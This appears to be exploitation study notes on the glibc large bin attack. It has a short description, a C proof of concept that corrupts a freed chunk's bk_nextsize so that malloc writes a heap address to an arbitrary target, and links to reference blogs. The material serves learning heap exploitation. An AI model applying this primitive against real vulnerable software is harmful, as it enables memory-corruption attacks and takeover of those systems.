<details>
<summary><strong>Description</strong></summary>
<p>

In practice, large bin attack is generally prepared for further attacks, such as rewriting the global variable `global_max_fast` in libc for further fastbin attack, or `_IO_list_all` for FSOP attack (it only can rewrite with heap address value...)

</p>
</details>

<details>
<summary><strong>POC</strong></summary>
<p>

> compiled in glibc `2.31`, `2.35`, `2.38` and `2.39`

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    setbuf(stdin, NULL); // disable buffering so _IO_FILE does not interfere with our heap
    setbuf(stdout, NULL);

    long target = 0, *chunk1, *chunk2, *chunk3;

    // allocate two large chunks
    chunk1 = malloc(0x428); // request large chunk
    malloc(0x18); // padding chunk to prevent consolidation
    chunk2 = malloc(0x418); // reuqest anotherlarge chunk, should be smaller than p1 and belong to the same largebin
    malloc(0x18); // padding chunk to prevent consolidation

    free(chunk1); // move chunk1 into unsortedbin

    malloc(0x438); // request size bigger than chunk1, sort chunk1 into largebin

    free(chunk2); // move chunk2 into unsortedbin

    chunk1[3] = ((long)(&target) - 0x20); // modify chunk1->bk_nextsize to [target - 0x20]

    malloc(0x438); // request size bigger than chunk2 (should larger than chunk1 too to prevent error), sort chunk2 into largebin
    // overwritten chunk1->bk_nextsize->fd_nexsize = chunk2 while sorting

    printf("target: %p\n", target);
}
```

</p>
</details>

<details>
<summary><strong>Ref docs</strong></summary>
<p>

I dont think i can explain this, for deeper understanding, you should check this blogs:

- https://4xura.com/pwn/heap/large-bin-attack/
- https://github.com/guyinatuxedo/Shogun/blob/main/bin_overviews/large_bins.md

</p>
</details>